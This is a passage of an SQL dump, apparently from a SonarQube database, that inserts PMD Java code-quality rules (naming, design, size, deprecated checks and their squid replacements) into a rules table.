</p>', 3, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811920, 1510817811921, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (237, 'Extends Object', 'ExtendsObject', 'rulesets/java/basic.xml/ExtendsObject', 'pmd', 'No need to explicitly extend Object. Example: 
<pre>
public class Foo extends Object { // not required
}
</pre>

<p>
  This rule is deprecated, use {rule:squid:S1939} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811922, 1510817811922, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (238, 'Accessor Class Generation', 'AccessorClassGeneration', 'rulesets/java/design.xml/AccessorClassGeneration', 'pmd', 'Instantiation by way of private constructors from outside of the constructor''s class often causes the generation of an accessor. A factory method, or non-privitization of the constructor can eliminate this situation. The generated class file is actually an interface. It gives the accessing class the ability to invoke a new hidden package scope constructor that takes the interface as a supplementary parameter. This turns a private constructor effectively into one with package scope, and is challenging to discern.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811923, 1510817811924, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (239, 'Too Many Fields', 'TooManyFields', 'rulesets/java/codesize.xml/TooManyFields', 'pmd', 'Classes that have too many fields could be redesigned to have fewer fields, possibly through some nested object grouping of some of the information. For example, a class with city/state/zip fields could instead have one Address field.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811925, 1510817811926, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (240, 'Check ResultSet', 'CheckResultSet', 'rulesets/java/basic.xml/CheckResultSet', 'pmd', 'Always check the return of one of the navigation method (next,previous,first,last) of a ResultSet. Indeed, if the value return is "false", the developer should deal with it !', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811928, 1510817811928, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (241, 'Empty Try Block', 'EmptyTryBlock', 'rulesets/java/empty.xml/EmptyTryBlock', 'pmd', 'Avoid empty try blocks - what''s the point?

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811929, 1510817811930, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (242, 'String To String', 'StringToString', 'rulesets/java/strings.xml/StringToString', 'pmd', 'Avoid calling toString() on String objects; this is unnecessary.

<p>
  This rule is deprecated, use {rule:squid:S1858} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811932, 1510817811933, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (245, 'Ncss Method Count', 'NcssMethodCount', 'rulesets/java/codesize.xml/NcssMethodCount', 'pmd', 'This rule uses the NCSS (Non Commenting Source Statements) algorithm to determine the number of lines of code for a given method. NCSS ignores comments, and counts actual statements. Using this algorithm, lines of code that are split are counted as one.

<p>
This rule is deprecated, use {rule:squid:S138} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811937, 1510817811938, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (246, 'Boolean Get Method Name', 'BooleanGetMethodName', 'rulesets/java/naming.xml/BooleanGetMethodName', 'pmd', 'Looks for methods named "getX()" with "boolean" as the return type. The convention is to name these methods "isX()".', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811940, 1510817811940, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (247, 'Avoid unnecessary comparisons in boolean expressions', 'SimplifyBooleanExpressions', 'rulesets/java/design.xml/SimplifyBooleanExpressions', 'pmd', 'Avoid unnecessary comparisons in boolean expressions - this complicates simple code. Example :
<pre>
public class Bar {
 // can be simplified to
 // bar = isFoo();
 private boolean bar = (isFoo() == true);

 public isFoo() { return false;}
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1125} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811942, 1510817811943, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (248, 'Code size - cyclomatic complexity', 'CyclomaticComplexity', 'rulesets/java/codesize.xml/CyclomaticComplexity', 'pmd', '<p>
Complexity is determined by the number of decision points in a method plus one for the method entry. The decision points are ''if'', ''while'', ''for'', and ''case labels''. Generally, 1-4 is low complexity, 5-7 indicates moderate complexity, 8-10 is high complexity, and 11+ is very high complexity.
</p>

<p>
This rule is deprecated, use {rule:squid:MethodCyclomaticComplexity} or {rule:squid:ClassCyclomaticComplexity} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '3h', NULL, NULL, 'size', false, 'HTML', 1510817811944, 1510817811944, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (249, 'Too few branches for a switch statement', 'TooFewBranchesForASwitchStatement', 'rulesets/java/design.xml/TooFewBranchesForASwitchStatement', 'pmd', 'Swith are designed complex branches, and allow branches to share treatement. Using a switch for only a few branches is ill advised, as switches are not as easy to understand as if. In this case, it''s most likely is a good idea to use a if statement instead, at least to increase code readability. Example :
<pre>
// With a minimumNumberCaseForASwitch of 3
public class Foo {
  public void bar() {
    switch (condition) {
      case ONE:
        instruction;
        break;
      default:
        break; // not enough for a ''switch'' stmt,
               // a simple ''if'' stmt would have been more appropriate
    }
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S1301} instead.
</p>', 1, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '30min', NULL, NULL, NULL, false, 'HTML', 1510817811950, 1510817811952, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (250, 'Unused private method', 'UnusedPrivateMethod', 'rulesets/java/unusedcode.xml/UnusedPrivateMethod', 'pmd', '<p>
Unused Private Method detects when a private method is declared but is unused. This PMD rule should be switched off and replaced by its equivalent from Squid that is more effective : it generates less false-positives and detects more dead code.
</p>

<p>
This rule is deprecated, use {rule:squid:UnusedPrivateMethod} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'unused-code', false, 'HTML', 1510817811954, 1510817811955, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (251, 'Add Empty String', 'AddEmptyString', 'rulesets/java/optimizations.xml/AddEmptyString', 'pmd', 'Finds empty string literals which are being added. This is an inefficient way to convert any type to a String.

<p>
  This rule is deprecated, use {rule:squid:S2131} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811956, 1510817811956, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (252, 'Modified Cyclomatic Complexity', 'ModifiedCyclomaticComplexity', 'rulesets/java/codesize.xml/ModifiedCyclomaticComplexity', 'pmd', 'Complexity directly affects maintenance costs is determined by the number of decision points in a method plus one for the method entry. The decision points include ''if'', ''while'', ''for'', and ''case labels'' calls. Generally, numbers ranging from 1-4 denote low complexity, 5-7 denote moderate complexity, 8-10 denote high complexity, and 11+ is very high complexity. Modified complexity treats switch statements as a single decision point.

<p>
  This rule is deprecated, use {rule:squid:MethodCyclomaticComplexity} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '1h', NULL, NULL, 'size', false, 'HTML', 1510817811957, 1510817811958, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (253, 'Empty Static Initializer', 'EmptyStaticInitializer', 'rulesets/java/empty.xml/EmptyStaticInitializer', 'pmd', 'An empty static initializer was found.

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811962, 1510817811963, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (254, 'Big Integer Instantiation', 'BigIntegerInstantiation', 'rulesets/java/basic.xml/BigIntegerInstantiation', 'pmd', 'Don''t create instances of already existing BigInteger (BigInteger.ZERO, BigInteger.ONE) and for 1.5 on, BigInteger.TEN and BigDecimal (BigDecimal.ZERO, BigDecimal.ONE, BigDecimal.TEN)', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811964, 1510817811964, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (255, 'Clone method must implement Cloneable', 'CloneMethodMustImplementCloneable', 'rulesets/java/clone.xml/CloneMethodMustImplementCloneable', 'pmd', 'The method clone() should only be implemented if the class implements the Cloneable interface with the exception of a final method that only throws CloneNotSupportedException.

<p>
This rule is deprecated, use {rule:squid:S1182} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811966, 1510817811966, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (256, 'God Class', 'GodClass', 'rulesets/java/design.xml/GodClass', 'pmd', 'The God Class rule detects the God Class design flaw using metrics. God classes do too many things,
are very big and overly complex. They should be split apart to be more object-oriented.
The rule uses the detection strategy described in "Object-Oriented Metrics in Practice".
The violations are reported against the entire class. See also the references:
Michele Lanza and Radu Marinescu. Object-Oriented Metrics in Practice:
Using Software Metrics to Characterize, Evaluate, and Improve the Design
of Object-Oriented Systems. Springer, Berlin, 1 edition, October 2006. Page 80.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2h', NULL, NULL, NULL, false, 'HTML', 1510817811968, 1510817811970, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (257, 'Exception As Flow Control', 'ExceptionAsFlowControl', 'rulesets/java/strictexception.xml/ExceptionAsFlowControl', 'pmd', 'Using Exceptions as flow control leads to GOTOish code and obscures true exceptions when debugging.

<p>
This rule is deprecated, use {rule:squid:S1141} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817811974, 1510817811975, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (258, 'Naming - Method naming conventions', 'MethodNamingConventions', 'rulesets/java/naming.xml/MethodNamingConventions', 'pmd', 'Method names should always begin with a lower case character, and should not contain underscores. Example :
<pre>
public class Foo {
  public void fooStuff() {
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00100} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, 'naming', false, 'HTML', 1510817811976, 1510817811977, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (259, 'Naming - Misleading variable name', 'MisleadingVariableName', 'rulesets/java/naming.xml/MisleadingVariableName', 'pmd', 'Detects when a non-field has a name starting with ''m_''. This usually indicates a field and thus is confusing. Example :
<pre>
public class Foo {
  private int m_foo; // OK
  public void bar(String m_baz) {  // Bad
    int m_boz = 42; // Bad
  }
}
</pre>

<p>
This rule is deprecated, use {rule:squid:S00117} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811978, 1510817811979, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (260, 'Redundant Field Initializer', 'RedundantFieldInitializer', 'rulesets/java/optimizations.xml/RedundantFieldInitializer', 'pmd', 'Java will initialize fields with known default values so any explicit initialization of those same defaults
is redundant and results in a larger class file (approximately three additional bytecode instructions per field). Example: 
<pre>
public class C {
  boolean b = false; // examples of redundant initializers
  byte by   = 0;
  short s   = 0;
  char c    = 0;
  int i     = 0;
  long l    = 0;

  float f   = .0f;   // all possible float literals
  doable d  = 0d;    // all possible double literals
  Object o  = null;

  MyClass mca[] = null;
  int i1 = 0, ia1[] = null;

  class Nested {
    boolean b = false;
  }
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811980, 1510817811981, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (261, 'Dont Call Thread Run', 'DontCallThreadRun', 'rulesets/java/basic.xml/DontCallThreadRun', 'pmd', 'Explicitly calling Thread.run() method will execute in the caller''s thread of control.  Instead, call Thread.start() for the intended behavior.

<p>
This rule is deprecated, use {rule:squid:S1217} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811982, 1510817811982, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (262, 'By convention, classes that implement the Cloneable interface should override Object.clone (which is protected) with a public method', 'CloneMethodMustBePublic', 'rulesets/java/clone.xml/CloneMethodMustBePublic', 'pmd', '<p>
  The java Manual says “By convention, classes that implement this interface should override Object.clone (which is protected) with a public method.”
</p>

<p>Examples:</p>
<pre>
public class Foo implements Cloneable {
  @Override
  protected Object clone() throws CloneNotSupportedException { // Violation, must be public
  }
}

public class Foo implements Cloneable {
  @Override
  protected Foo clone() { // Violation, must be public
  }
}

public class Foo implements Cloneable {
  @Override
  public Object clone() // Ok
}
</pre>', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '2min', NULL, NULL, NULL, false, 'HTML', 1510817811983, 1510817811984, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (263, 'Use Proper Class Loader', 'UseProperClassLoader', 'rulesets/java/j2ee.xml/UseProperClassLoader', 'pmd', 'In J2EE getClassLoader() might not work as expected. Use Thread.currentThread().getContextClassLoader() instead.', 3, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, NULL, false, 'HTML', 1510817811987, 1510817811988, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (264, 'Unnecessary Final Modifier', 'UnnecessaryFinalModifier', 'rulesets/java/unnecessary.xml/UnnecessaryFinalModifier', 'pmd', 'When a class has the final modifier, all the methods are automatically final.', 0, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811989, 1510817811989, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (265, 'No package', 'NoPackage', 'rulesets/java/naming.xml/NoPackage', 'pmd', 'Detects when a class or interface does not have a package definition. Example :
  <pre>
// no package declaration
public class ClassInDefaultPackage {
}
  </pre>

<p>
This rule is deprecated, use {rule:squid:S1220} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817811990, 1510817811991, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (266, 'Abstract Class Without Abstract Method', 'AbstractClassWithoutAbstractMethod', 'rulesets/java/design.xml/AbstractClassWithoutAbstractMethod', 'pmd', 'The abstract class does not contain any abstract methods. An abstract class suggests an incomplete implementation, which is to be completed by subclasses implementing the abstract methods. If the class is intended to be used as a base class only (not to be instantiated direcly) a protected constructor can be provided prevent direct instantiation.

<p>
This rule is deprecated, use {rule:squid:S1694} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817811992, 1510817811992, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (267, 'Uncommented Empty Constructor', 'UncommentedEmptyConstructor', 'rulesets/java/design.xml/UncommentedEmptyConstructor', 'pmd', 'Uncommented Empty Constructor finds instances where a constructor does not contain statements, but there is no comment. By explicitly commenting empty constructors it is easier to distinguish between intentional (commented) and unintentional empty constructors.

<p>
  This rule is deprecated, use {rule:squid:S2094} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '15min', NULL, NULL, 'comment', false, 'HTML', 1510817811993, 1510817811994, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (268, 'Insufficient String Buffer Declaration', 'InsufficientStringBufferDeclaration', 'rulesets/java/strings.xml/InsufficientStringBufferDeclaration', 'pmd', 'Failing to pre-size a StringBuffer properly could cause it to re-size many times during runtime. This rule checks the characters that are actually passed into StringBuffer.append(), but represents a best guess worst case scenario. An empty StringBuffer constructor initializes the object to 16 characters. This default is assumed if the length of the constructor can not be determined.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812000, 1510817812000, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (269, 'Comment Required', 'CommentRequired', 'rulesets/java/comments.xml/CommentRequired', 'pmd', 'Denotes whether comments are required (or unwanted) for specific language elements. Example: 
<pre>
/**
* 
*
* @author George Bush
*/
</pre>', 1, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '5min', NULL, NULL, NULL, false, 'HTML', 1510817812002, 1510817812002, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (270, 'Confusing Ternary', 'ConfusingTernary', 'rulesets/java/design.xml/ConfusingTernary', 'pmd', 'In an if expression with an else clause, avoid negation in the test. For example, rephrase: if (x != y) diff(); else same(); as: if (x == y) same(); else diff(); Most if (x != y) cases without an else are often return cases, so consistent use of this rule makes the code easier to read. Also, this resolves trivial ordering problems, such as does the error case go first? or does the common case go first?.', 2, NULL, 'READY', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '10min', NULL, NULL, NULL, false, 'HTML', 1510817812004, 1510817812004, 1);
INSERT INTO rules (id, name, plugin_rule_key, plugin_config_key, plugin_name, description, priority, template_id, status, language, note_created_at, note_updated_at, note_user_login, note_data, remediation_function, def_remediation_function, remediation_gap_mult, def_remediation_gap_mult, remediation_base_effort, def_remediation_base_effort, gap_description, tags, system_tags, is_template, description_format, created_at, updated_at, rule_type) VALUES (271, 'Empty Switch Statements', 'EmptySwitchStatements', 'rulesets/java/empty.xml/EmptySwitchStatements', 'pmd', 'Avoid empty switch statements.

<p>
This rule is deprecated, use {rule:squid:S00108} instead.
</p>', 2, NULL, 'DEPRECATED', 'java', NULL, NULL, NULL, NULL, NULL, 'CONSTANT_ISSUE', NULL, NULL, NULL, '20min', NULL, NULL, NULL, false, 'HTML', 1510817812005, 1510817812006, 1);
